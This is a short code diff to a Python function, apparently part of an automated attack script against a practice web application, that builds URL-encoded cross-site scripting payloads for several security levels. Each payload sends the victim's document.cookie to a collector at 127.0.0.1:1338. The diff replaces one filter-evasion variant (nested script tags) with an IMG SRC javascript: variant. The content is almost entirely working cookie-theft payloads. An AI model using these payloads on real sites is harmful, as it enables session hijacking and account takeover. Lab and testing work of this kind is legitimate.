@@ -45,7 +45,7 @@ def xss(vuln_type, level):
         if level == 'low':
             lang = '%3Cscript%3Ewindow.open(%22http://127.0.0.1:1338/xss/3?cookie=%22%20+%20document.cookie)%3C/script%3E'
         elif level == 'medium':
-            lang = '%3Cscri%3Cscript%3Ept%3Ewindow.open(%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F3%3Fcookie%3D%22%20%2B%20document.cookie)%3C%2Fscri%3C%2Fscript%3Ept%3E'
+            lang = '%3CIMG%20SRC=%22javascript:window.open(%27http://127.0.0.1:1338/xss/3?cookie=%27%20+%20document.cookie);%22%3E'
         else:
             lang = '%3CIMG%20SRC%3D%22javascript%3Awindow.open(%26apos%3Bhttp%3A%2F%2F127.0.0.1%3A1338%2Fxss%2F2%3Fcookie%3D%26apos%3B%20%2B%20document.cookie)%3B%22%3E'
         url = '/'.join([TARGET_SERVER_ENDPOINT, 'xss', vuln_type, level]) + '?lang=' + lang
